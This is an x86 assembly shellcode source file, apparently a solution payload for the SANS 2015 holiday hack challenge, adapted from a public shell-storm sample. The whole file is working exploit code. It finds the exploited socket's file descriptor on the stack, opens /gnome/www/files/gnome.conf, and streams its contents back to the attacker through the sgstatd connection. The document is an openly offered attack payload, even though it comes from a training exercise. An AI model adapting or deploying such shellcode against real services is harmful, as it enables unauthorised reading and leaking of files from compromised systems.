; 
; Author: Mutti K
; Purpose: sans 2015 xmas hack challenge 4.5
; Original taken from http://shell-storm.org/shellcode/files/shellcode-73.php and adapted.

global _start

section .text

_start:
	;Because we don't know the current socket's stdout fd I have trick to obtain it.
	;When the shellcode is reached, ecx points to a location on the stack.
	mov 	edi, ecx ; ecx points to the stack
	; esp original offset when sgstatd was first entered , causing null bytes in shellcode
	sub	edi,0x1c ; socket's stdout fd is located at 0x1c bytes from esp
	xor 	eax, eax
	xor 	ecx, ecx
	xor 	edx, edx
	jmp	two ; find filename path string location on stack
one:
	pop	ebx
	mov	al,byte 5 	; open()
	xor	ecx, ecx	; open mode 0 readonly
	int	80h
	
	mov	esi,eax 	; save new open fd to esi
	jmp	read
exit:
;Going to try to reduce size of shellcode
;	mov	al, 1 		; exit()
;	xor	ebx, ebx
;	int	80h

read:
	mov	ebx,esi		; copy open fd for read()
	mov	al,3 		; read()
	sub	esp,1
	lea	ecx,[esp]
	mov	dl,1
	int	80h

	xor	ebx, ebx
	cmp	ebx,eax
	je	exit

	mov	al,4 		; write()
	mov	ebx,[edi] ; file descriptor referenced at _start of shellcode
	mov	dl,1
	int	80h
	
	add	esp,1
	jmp	read

two:
	call	one
	filename:	db "/gnome/www/files/gnome.conf"
;Append null byte \x00 to end of shellcode after converting to hexes
